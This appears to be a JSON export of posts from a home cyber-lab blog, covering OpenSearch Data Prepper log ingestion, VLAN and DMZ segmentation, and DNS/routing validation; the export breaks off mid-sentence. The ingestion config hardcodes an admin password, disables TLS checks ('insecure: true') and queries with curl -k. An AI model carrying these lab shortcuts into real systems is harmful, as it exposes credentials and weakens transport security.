[{"content":" \u0026ldquo;In the middle of every difficulty lies opportunity.\u0026rdquo; ‚Äî Albert Einstein\nüß† Migrating to OpenSearch with Data Prepper for Log Ingestion This post chronicles the replacement of Filebeat OSS with OpenSearch Data Prepper in the segmented OPFORGE lab. It captures troubleshooting, configuration, and validation processes that highlight modern, modular ingestion practices suited for a realistic Blue Team SIEM environment.\nüìå Abstract Problem: Filebeat OSS 7.12.x caused ingestion failures with OpenSearch 2.13.0 due to unsupported _type metadata in bulk events.\nApproach: Replace Filebeat with OpenSearch Data Prepper and rewire ingestion pipelines using declarative YAML configs and mounted volumes.\nAlignment: Aligns with GCFA and GCFR (forensic ingestion), GPYC (log analysis), and GREM (log-based malware traces). Also relevant for CISSP/OSCP foundations on secure system design and detection control validation.\nOutcome: Successful ingestion into log-pipeline-* indices using Data Prepper, enabling log parsing and future ML-driven detection correlation.\nüìö Prerequisites OpenSearch 2.13.0 running in Docker Compose Basic Linux + Docker knowledge Segmented OPFORGE lab with opf-log01 node Prior failed attempts to use Filebeat OSS ‚úÖ Tasks This Phase Remove legacy Filebeat configuration Create Data Prepper pipeline and config files Mount them into container via docker-compose.yml Generate test logs and verify end-to-end ingestion üîß Configuration Summary üßπ Purge Filebeat # Stop services cd ~/Logstack docker compose down # Clean up legacy beats rm -rf filebeat.yml logs/ /usr/share/filebeat üì∏ Screenshot: Filebeat logs with _type rejection error\nüß¨ Data Prepper Pipeline (pipelines/log-pipeline.yaml) version: \u0026#34;2\u0026#34; pipeline: source: file: path: \u0026#34;/usr/share/data-prepper/logs/*.log\u0026#34; scan_interval: \u0026#34;5s\u0026#34; encoding: \u0026#34;utf-8\u0026#34; format: \u0026#34;plain_text\u0026#34; sink: - opensearch: hosts: [\u0026#34;https://opensearch:9200\u0026#34;] username: \u0026#34;admin\u0026#34; password: \u0026#34;AdminAdminqwer123!\u0026#34; index: \u0026#34;log-pipeline-%{+yyyy.MM.dd}\u0026#34; insecure: true ‚öôÔ∏è Data Prepper Config (data-prepper-config.yaml) ssl: false log-pipeline-default-target: stdout üì∏ Screenshot: data-prepper config directory with pipeline and logs mount visible\nüê≥ Compose Add-on (docker-compose.yml snippet) data-prepper: image: opensearchproject/data-prepper:2.3.0 container_name: data-prepper volumes: - ./pipelines:/usr/share/data-prepper/pipelines - ./data-prepper-config.yaml:/usr/share/data-prepper/data-prepper-config.yaml - ./logs:/usr/share/data-prepper/logs environment: - DATA_PREPPER_LOGS_STDOUT=true ports: - \u0026#34;4900:4900\u0026#34; - \u0026#34;21890:21890\u0026#34; networks: - logstack_net depends_on: - opensearch restart: unless-stopped üß™ Test Log Injection mkdir -p logs echo \u0026#34;üöÄ Hello OPFORGE from Data Prepper - $(date)\u0026#34; \u0026gt;\u0026gt; logs/test.log üì∏ Screenshot: OPFORGE message in test.log\nüîç Validate Index Creation curl -u admin:AdminAdminqwer123! -k \\ \u0026#34;https://localhost:9200/log-pipeline-*/_search?q=message:OPFORGE\u0026amp;pretty\u0026#34; If empty:\ndocker logs -f data-prepper üì∏ Screenshot: successful log-pipeline-* index in _cat/indices\nüö® Troubleshooting: Disk Space \u0026amp; Permissions df -h sudo du -sh /* 2\u0026gt;/dev/null | sort -hr | head -n 15 sudo journalctl --vacuum-time=2d sudo apt clean sudo docker system prune -a üì∏ Screenshot: flood watermark warning from OpenSearch logs\nüåü Key Takeaways Filebeat OSS is no longer viable for OpenSearch 2.13.x due to _type incompatibility Data Prepper offers a drop-in file source pipeline with better error visibility This lays the groundwork for parsing, enrichment, and ECS normalization üß≠ On Deck Add Sysmon + Zeek logs into the Data Prepper stream Use Jupyter to correlate detections with OPFORGE Red Team triggers Replace raw logs with parsed ECS format for dashboards OPFORGE\u0026rsquo;s detection fabric is now ingesting structured logs‚Äîready for enrichment, analytics, and red-vs-blue scenarios.\n‚ÄîH.Y.P.R.\n","permalink":"https://opforge.dev/posts/opforge_post_8_opensearch_dataprepper/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;In the middle of every difficulty lies opportunity.\u0026rdquo; ‚Äî Albert Einstein\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-migrating-to-opensearch-with-data-prepper-for-log-ingestion\"\u003eüß† Migrating to OpenSearch with Data Prepper for Log Ingestion\u003c/h1\u003e\n\u003cp\u003eThis post chronicles the replacement of Filebeat OSS with OpenSearch Data Prepper in the segmented OPFORGE lab. It captures troubleshooting, configuration, and validation processes that highlight modern, modular ingestion practices suited for a realistic Blue Team SIEM environment.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-abstract\"\u003eüìå Abstract\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eProblem:\u003c/strong\u003e Filebeat OSS 7.12.x caused ingestion failures with OpenSearch 2.13.0 due to unsupported \u003ccode\u003e_type\u003c/code\u003e metadata in bulk events.\u003c/p\u003e","title":"Post 8: Migrating to OpenSearch with Data Prepper for Log Ingestion"},{"content":" \u0026ldquo;Luck is what happens when preparation meets opportunity.\u0026rdquo; ‚Äî Seneca\nüß≠ OPFORGE Lab Companion Sheet This companion sheet is a quick-reference guide for building and navigating the OPFORGE segmented lab environment. It aligns with blog posts 1 through 7 and supports realistic threat emulation, detection validation, and cyber-AI experimentation.\nüß± Lab Zones \u0026amp; Addressing Zone CIDR Description Gateway RED_NET 192.168.50.0/24 Offensive tools, implants, C2s 192.168.50.1 INTERNAL_NET 192.168.60.0/24 Clients, Domain Controller, Blue Team infra 192.168.60.1 DMZ_NET 192.168.20.0/24 Public-facing services 192.168.20.1 LAN_WORKSTATIONS 192.168.30.0/24 User workstations 192.168.30.1 EXT_NET (Transit) 192.168.41.0/24 Between DMZ and InternetSim 192.168.41.1 InternetSim 192.168.40.0/24 Simulated public Internet 192.168.40.1 üì¶ Core Systems Hostname Role IP Address Notes OPF-DC01 Windows AD/DNS Controller 192.168.60.5 Authoritative for opforge.local OPF-FW-DMZ pfSense Firewall 192.168.20.5 Routes/filters between DMZ + EXT_NET OPF-RT-RED VyOS Router for RED_NET 192.168.50.1 Static route ‚Üí EXT_NET via 192.168.50.2 OPF-RT-EXT VyOS Router between DMZ \u0026amp; RED 192.168.20.2 Dual NIC on DMZ + EXT OPF-RT-INET VyOS Router for simulated Internet 192.168.40.1 Outbound only OPF-RT-INT VyOS Router for Internal Network 192.168.60.1 Connected to Domain + workstations OPF-RT-DMZ Trunk router with VLAN 41 192.168.41.2 Connected to pfSense DMZ transit üì° DNS Role Assignment Device Interface Role Primary DNS Fallback DNS Notes opf-rt-int Internal network 192.168.60.5 1.1.1.1, 8.8.8.8 Uses AD DNS opf-rt-inet Internet gateway 1.1.1.1 8.8.8.8 Strict external only opf-rt-red Red team network 192.168.50.1 1.1.1.1 pfSense for monitoring opf-rt-ext External/DMZ router 192.168.50.1 1.1.1.1 No internal lookup opf-fw-dmz DMZ Firewall 1.1.1.1 8.8.8.8 Forwards to internal or external üîê Firewall Rule Logic (pfSense) Allow DNS (TCP/UDP 53) from INTERNAL_NET to opf-dc01 Allow ICMP selectively (ping, traceroute validation) Allow NTP (UDP 123) Allow HTTP/HTTPS only to specific zones Deny all else explicitly with logging üìë DNS Resolver Config (pfSense) Enabled DNS Resolver Domain override: opforge.local ‚Üí 192.168.60.5 General DNS: 1.1.1.1, 8.8.8.8 Outgoing Interface: DMZ_TRANSIT_VLAN41 üîÑ VyOS Routing Sample (per router) configure set protocols static route 192.168.30.0/24 next-hop 192.168.20.2 set protocols static route 192.168.60.0/24 next-hop 192.168.30.1 commit; save üß™ Validation Commands Windows ping opf-dc01 nslookup google.com tracert opf-dc01.opforge.local Linux cat /etc/resolv.conf ping opf-dc01.opforge.local systemd-resolve --status üó∫ Timeline Snapshot (Posts 1‚Äì7) Post # Milestone 1 Lab Design + Purpose Defined 2 Static Routing and Interfaces Set 3 Subnet Segmentation (Red, Blue, DMZ) 4 (Deprecated ‚Äì merged into 5 \u0026amp; 7) 5 DNS Resolver, Domain Controller Setup 6 Cross-zone DNS + Routing Fully Validated 7 VLAN 41 Added, pfSense Transit Config Completed üß† Tips \u0026amp; Notes Always snapshot before making routing/firewall changes Use tcpdump or Packet Capture in pfSense for flow debugging Keep /etc/hosts clean and prefer DNS testing via resolvers Maintain NAT boundaries only where necessary (egress control) üß© Next Companion Add-ons Network diagram (SVG/PNG) Credential vault structure (how secrets are handled) Integration plans for Zeek and detection engines Stay methodical. Document everything. Grow forward.\n‚Äî H.Y.P.R.\n","permalink":"https://opforge.dev/docs/opforge_lab_sheet/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;Luck is what happens when preparation meets opportunity.\u0026rdquo; ‚Äî Seneca\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-opforge-lab-companion-sheet\"\u003eüß≠ OPFORGE Lab Companion Sheet\u003c/h1\u003e\n\u003cp\u003eThis companion sheet is a quick-reference guide for building and navigating the OPFORGE segmented lab environment. It aligns with blog posts 1 through 7 and supports realistic threat emulation, detection validation, and cyber-AI experimentation.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-lab-zones--addressing\"\u003eüß± Lab Zones \u0026amp; Addressing\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eZone\u003c/th\u003e\n          \u003cth\u003eCIDR\u003c/th\u003e\n          \u003cth\u003eDescription\u003c/th\u003e\n          \u003cth\u003eGateway\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eRED_NET\u003c/td\u003e\n          \u003ctd\u003e192.168.50.0/24\u003c/td\u003e\n          \u003ctd\u003eOffensive tools, implants, C2s\u003c/td\u003e\n          \u003ctd\u003e192.168.50.1\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eINTERNAL_NET\u003c/td\u003e\n          \u003ctd\u003e192.168.60.0/24\u003c/td\u003e\n          \u003ctd\u003eClients, Domain Controller, Blue Team infra\u003c/td\u003e\n          \u003ctd\u003e192.168.60.1\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eDMZ_NET\u003c/td\u003e\n          \u003ctd\u003e192.168.20.0/24\u003c/td\u003e\n          \u003ctd\u003ePublic-facing services\u003c/td\u003e\n          \u003ctd\u003e192.168.20.1\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLAN_WORKSTATIONS\u003c/td\u003e\n          \u003ctd\u003e192.168.30.0/24\u003c/td\u003e\n          \u003ctd\u003eUser workstations\u003c/td\u003e\n          \u003ctd\u003e192.168.30.1\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eEXT_NET (Transit)\u003c/td\u003e\n          \u003ctd\u003e192.168.41.0/24\u003c/td\u003e\n          \u003ctd\u003eBetween DMZ and InternetSim\u003c/td\u003e\n          \u003ctd\u003e192.168.41.1\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eInternetSim\u003c/td\u003e\n          \u003ctd\u003e192.168.40.0/24\u003c/td\u003e\n          \u003ctd\u003eSimulated public Internet\u003c/td\u003e\n          \u003ctd\u003e192.168.40.1\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"-core-systems\"\u003eüì¶ Core Systems\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eHostname\u003c/th\u003e\n          \u003cth\u003eRole\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eNotes\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOPF-DC01\u003c/td\u003e\n          \u003ctd\u003eWindows AD/DNS Controller\u003c/td\u003e\n          \u003ctd\u003e192.168.60.5\u003c/td\u003e\n          \u003ctd\u003eAuthoritative for opforge.local\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOPF-FW-DMZ\u003c/td\u003e\n          \u003ctd\u003epfSense Firewall\u003c/td\u003e\n          \u003ctd\u003e192.168.20.5\u003c/td\u003e\n          \u003ctd\u003eRoutes/filters between DMZ + EXT_NET\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOPF-RT-RED\u003c/td\u003e\n          \u003ctd\u003eVyOS Router for RED_NET\u003c/td\u003e\n          \u003ctd\u003e192.168.50.1\u003c/td\u003e\n          \u003ctd\u003eStatic route ‚Üí EXT_NET via 192.168.50.2\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOPF-RT-EXT\u003c/td\u003e\n          \u003ctd\u003eVyOS Router between DMZ \u0026amp; RED\u003c/td\u003e\n          \u003ctd\u003e192.168.20.2\u003c/td\u003e\n          \u003ctd\u003eDual NIC on DMZ + EXT\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOPF-RT-INET\u003c/td\u003e\n          \u003ctd\u003eVyOS Router for simulated Internet\u003c/td\u003e\n          \u003ctd\u003e192.168.40.1\u003c/td\u003e\n          \u003ctd\u003eOutbound only\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOPF-RT-INT\u003c/td\u003e\n          \u003ctd\u003eVyOS Router for Internal Network\u003c/td\u003e\n          \u003ctd\u003e192.168.60.1\u003c/td\u003e\n          \u003ctd\u003eConnected to Domain + workstations\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOPF-RT-DMZ\u003c/td\u003e\n          \u003ctd\u003eTrunk router with VLAN 41\u003c/td\u003e\n          \u003ctd\u003e192.168.41.2\u003c/td\u003e\n          \u003ctd\u003eConnected to pfSense DMZ transit\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"-dns-role-assignment\"\u003eüì° DNS Role Assignment\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eDevice\u003c/th\u003e\n          \u003cth\u003eInterface Role\u003c/th\u003e\n          \u003cth\u003ePrimary DNS\u003c/th\u003e\n          \u003cth\u003eFallback DNS\u003c/th\u003e\n          \u003cth\u003eNotes\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-int\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eInternal network\u003c/td\u003e\n          \u003ctd\u003e192.168.60.5\u003c/td\u003e\n          \u003ctd\u003e1.1.1.1, 8.8.8.8\u003c/td\u003e\n          \u003ctd\u003eUses AD DNS\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-inet\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eInternet gateway\u003c/td\u003e\n          \u003ctd\u003e1.1.1.1\u003c/td\u003e\n          \u003ctd\u003e8.8.8.8\u003c/td\u003e\n          \u003ctd\u003eStrict external only\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-red\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eRed team network\u003c/td\u003e\n          \u003ctd\u003e192.168.50.1\u003c/td\u003e\n          \u003ctd\u003e1.1.1.1\u003c/td\u003e\n          \u003ctd\u003epfSense for monitoring\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-ext\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eExternal/DMZ router\u003c/td\u003e\n          \u003ctd\u003e192.168.50.1\u003c/td\u003e\n          \u003ctd\u003e1.1.1.1\u003c/td\u003e\n          \u003ctd\u003eNo internal lookup\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-fw-dmz\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eDMZ Firewall\u003c/td\u003e\n          \u003ctd\u003e1.1.1.1\u003c/td\u003e\n          \u003ctd\u003e8.8.8.8\u003c/td\u003e\n          \u003ctd\u003eForwards to internal or external\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"-firewall-rule-logic-pfsense\"\u003eüîê Firewall Rule Logic (pfSense)\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAllow\u003c/strong\u003e DNS (TCP/UDP 53) from INTERNAL_NET to \u003ccode\u003eopf-dc01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAllow\u003c/strong\u003e ICMP selectively (ping, traceroute validation)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAllow\u003c/strong\u003e NTP (UDP 123)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAllow\u003c/strong\u003e HTTP/HTTPS only to specific zones\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDeny\u003c/strong\u003e all else explicitly with logging\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-dns-resolver-config-pfsense\"\u003eüìë DNS Resolver Config (pfSense)\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eEnabled DNS Resolver\u003c/li\u003e\n\u003cli\u003eDomain override: \u003ccode\u003eopforge.local\u003c/code\u003e ‚Üí \u003ccode\u003e192.168.60.5\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eGeneral DNS: \u003ccode\u003e1.1.1.1\u003c/code\u003e, \u003ccode\u003e8.8.8.8\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eOutgoing Interface: \u003ccode\u003eDMZ_TRANSIT_VLAN41\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-vyos-routing-sample-per-router\"\u003eüîÑ VyOS Routing Sample (per router)\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-vyos\" data-lang=\"vyos\"\u003econfigure\nset protocols static route 192.168.30.0/24 next-hop 192.168.20.2\nset protocols static route 192.168.60.0/24 next-hop 192.168.30.1\ncommit; save\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"-validation-commands\"\u003eüß™ Validation Commands\u003c/h2\u003e\n\u003ch3 id=\"windows\"\u003eWindows\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eping opf-dc01\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enslookup google.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etracert opf-dc01.opforge.local\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"linux\"\u003eLinux\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eping opf-dc01.opforge.local\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemd-resolve --status\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"-timeline-snapshot-posts-17\"\u003eüó∫ Timeline Snapshot (Posts 1‚Äì7)\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003ePost #\u003c/th\u003e\n          \u003cth\u003eMilestone\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e1\u003c/td\u003e\n          \u003ctd\u003eLab Design + Purpose Defined\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e2\u003c/td\u003e\n          \u003ctd\u003eStatic Routing and Interfaces Set\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e3\u003c/td\u003e\n          \u003ctd\u003eSubnet Segmentation (Red, Blue, DMZ)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e4\u003c/td\u003e\n          \u003ctd\u003e(Deprecated ‚Äì merged into 5 \u0026amp; 7)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e5\u003c/td\u003e\n          \u003ctd\u003eDNS Resolver, Domain Controller Setup\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e6\u003c/td\u003e\n          \u003ctd\u003eCross-zone DNS + Routing Fully Validated\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e7\u003c/td\u003e\n          \u003ctd\u003eVLAN 41 Added, pfSense Transit Config Completed\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"-tips--notes\"\u003eüß† Tips \u0026amp; Notes\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eAlways snapshot before making routing/firewall changes\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003etcpdump\u003c/code\u003e or \u003ccode\u003ePacket Capture\u003c/code\u003e in pfSense for flow debugging\u003c/li\u003e\n\u003cli\u003eKeep \u003ccode\u003e/etc/hosts\u003c/code\u003e clean and prefer DNS testing via resolvers\u003c/li\u003e\n\u003cli\u003eMaintain NAT boundaries only where necessary (egress control)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-next-companion-add-ons\"\u003eüß© Next Companion Add-ons\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eNetwork diagram (SVG/PNG)\u003c/li\u003e\n\u003cli\u003eCredential vault structure (how secrets are handled)\u003c/li\u003e\n\u003cli\u003eIntegration plans for Zeek and detection engines\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003eStay methodical. Document everything. Grow forward.\u003c/p\u003e","title":"OPFORGE Lab Companion Sheet"},{"content":" \u0026ldquo;Divide and rule, the politician cries; unite and lead, is watchword of the wise.\u0026rdquo; ‚Äî Johann Wolfgang von Goethe\n‚ú® VLAN Foundations and DMZ Segmentation This post documents the foundational setup of VLAN-based segmentation in the OPFORGE lab, focusing on the transition from flat subnets to trunked interfaces and routed VLANs. It marks a major step in the network maturity of the lab, preparing for more realistic Red Team lateral movement simulations and Blue Team detection scenarios.\nüìå Abstract Problem: Flat subnets constrained emulation fidelity and detection depth in the OPFORGE lab.\nApproach: Implement 802.1Q VLAN tagging between pfSense and VyOS to route traffic across a dedicated DMZ transit network. Reassign NAT, DNS, and firewall rules to support segmentation.\nAlignment: This phase reinforces domain knowledge across CISSP (architecture), OSCP (pivoting), GCFA (network boundaries), and GXPN (attack paths).\nOutcome: A trunked VLAN transit network now supports east-west segmentation, setting the stage for endpoint tagging and future visibility validation.\nüìö Prerequisites VMware Workstation Pro with bridged and internal VMnets opf-fw-dmz as pfSense 2.7.2 opf-rt-ext and opf-rt-inet running VyOS Prior completion of Post 5: DNS + Routing end-to-end Comfortable with CLI-based firewall and router config ‚úÖ Tasks This Phase Tag VLAN 41 on pfSense and VyOS Assign 192.168.41.x/24 to em0.41 and eth1.41 Refactor routing, NAT, and DNS settings to use the new VLAN Transition firewall rules from WAN to VLAN interface üîß Configuration Summary VyOS (opf-rt-ext) configure delete interfaces ethernet eth1 address 192.168.40.1/24 set interfaces ethernet eth1 vif 41 address 192.168.41.1/24 set interfaces ethernet eth1 vif 41 description \u0026#39;DMZ_TRANSIT_VLAN41\u0026#39; set nat source rule 100 outbound-interface eth1.41 set nat source rule 100 source address 192.168.41.0/24 set nat source rule 100 translation address masquerade set protocols static route 192.168.50.0/24 next-hop 192.168.41.2 set protocols static route 192.168.60.0/24 next-hop 192.168.41.2 commit ; save pfSense (opf-fw-dmz) Add VLAN 41 on em0 ‚Üí em0.41 Set static IP: 192.168.41.2/24 Set upstream gateway: EXT_VLAN41 Move firewall rules from WAN to VLAN interface NAT: Source = 192.168.41.0/24, Interface NAT DNS Resolver: Listen + Outgoing = VLAN41 Routing Update (opf-rt-inet) configure set protocols static route 192.168.41.0/24 next-hop 192.168.30.2 commit ; save üåü Key Takeaways VLAN tagging via 802.1Q is now integrated across pfSense and VyOS End-to-end reachability was preserved through precise NAT and routing updates OPFORGE now has a DMZ segment that mirrors modern enterprise segmentation logic üß≠ On Deck VLAN interface tagging at the endpoint level for opf-lnx01 and opf-red01 Begin lateral movement simulation from RED_NET ‚Üí DMZ ‚Üí INT Integrate Zeek and Winlogbeat with DNS over HTTPS tracking to analyze visibility gaps The OPFORGE lab continues to evolve into a trusted, validated cyber operations training ground where every emulation leaves a detection trail‚Äîby design.\nH.Y.P.R. ","permalink":"https://opforge.dev/posts/opforge_post_7_vlan_segmentation/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;Divide and rule, the politician cries; unite and lead, is watchword of the wise.\u0026rdquo; ‚Äî Johann Wolfgang von Goethe\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-vlan-foundations-and-dmz-segmentation\"\u003e‚ú® VLAN Foundations and DMZ Segmentation\u003c/h1\u003e\n\u003cp\u003eThis post documents the foundational setup of VLAN-based segmentation in the OPFORGE lab, focusing on the transition from flat subnets to trunked interfaces and routed VLANs. It marks a major step in the network maturity of the lab, preparing for more realistic Red Team lateral movement simulations and Blue Team detection scenarios.\u003c/p\u003e","title":"Post 7: VLAN Foundations and DMZ Segmentation"},{"content":" \u0026ldquo;It is not because things are difficult that we do not dare, it is because we do not dare that they are difficult.\u0026rdquo; ‚Äî Seneca\nüåê Routing + DNS Success Across the OPFORGE Lab In this post, I walk through the successful validation of DNS and routing configurations across segmented OPFORGE networks. After implementing static routes, DNS forwarding, and conditional resolvers, systems across RED, DMZ, INT, and CSOC segments can now resolve opforge.local and route correctly.\nüìå Abstract Problem Statement: Without effective DNS and route resolution across segmented subnets, endpoint visibility and command/control emulation are degraded. Initial attempts left gaps in cross-zone name resolution and static route propagation.\nMethodology: Built upon previously defined subnets and pfSense + VyOS topology. Implemented DNS conditional forwarding from pfSense to Domain Controller and set external resolvers on pfSense to enable internet resolution. Verified with nslookup, PowerShell, and browser tests.\nCertifications \u0026amp; Academic Link: Supports CISSP (network architecture), GCFA (endpoint resolution validation), GCFR (forensics via FQDN traceability).\nExpected Outcomes: Cross-segment DNS success, complete route propagation, and operational readiness for Zeek tagging and C2 testing.\nüìö Prerequisites Completion of OPFORGE Post 5: DNS server running on opf-dc01, pfSense resolver configured Static routes in place between opf-fw-dmz, opf-rt-ext, opf-rt-inet, opf-rt-int Windows Domain Controller opf-dc01 configured at 192.168.60.5 Windows systems configured to use opf-dc01 as DNS Linux systems resolving via pfSense with .local domain override ‚úÖ Tasks This Phase Verified pfSense System \u0026gt; General Setup DNS entries: 1.1.1.1, 8.8.8.8 Enabled DNS Resolver with domain override: opforge.local ‚Üí 192.168.60.5 Confirmed that internal lookups do not leak to upstream resolvers Verified internal and external DNS resolution from both Windows and Linux hosts Captured trace routes and verified NAT return paths üîß Configuration Highlights pfSense DNS Configuration DNS Resolver: Enabled Domain Override: opforge.local ‚Üí 192.168.60.5 External Resolvers: 1.1.1.1, 8.8.8.8 in General Settings Options: Disabled DNS override and enabled query forwarding VyOS Routing configure set protocols static route 192.168.30.0/24 next-hop 192.168.20.2 set protocols static route 192.168.20.0/24 next-hop 192.168.30.1 delete system name-server \u0026lt;legacy_ip\u0026gt; commit; save Windows DNS Validation nslookup opf-dc01.opforge.local Resolve-DnsName opf-dc01 ping opf-dc01 Linux DNS Validation cat /etc/resolv.conf systemd-resolve --status | grep opforge.local ping opf-dc01.opforge.local üîß DNS Role Assignment To enforce separation of concern and traceable DNS activity, we explicitly assigned roles for DNS resolution across the routers and firewalls:\nRouter Interface Role Primary DNS Fallback DNS Notes opf-rt-int Internal network 192.168.60.5 1.1.1.1, 8.8.8.8 AD DNS for internal name resolution opf-rt-inet Internet gateway 1.1.1.1 8.8.8.8 No internal resolution, strict egress DNS opf-rt-red Red Team network 192.168.50.1 1.1.1.1 Uses pfSense DNS for monitoring/logging opf-rt-ext External/DMZ router 192.168.50.1 1.1.1.1 Simulated public infra, isolated opf-fw-dmz DMZ Firewall 1.1.1.1 8.8.8.8 Forwarding DNS, optionally recursive üß™ Final Validations From OPF-DC01 (192.168.60.5):\nüü¢ Can ping all expected routers üü¢ nslookup google.com resolves via opf-fw-dmz üü¢ tracert validates return paths üü¢ Internal name resolution (opf-dc01.opforge.local) functions as intended Captured logs in pfSense confirm that 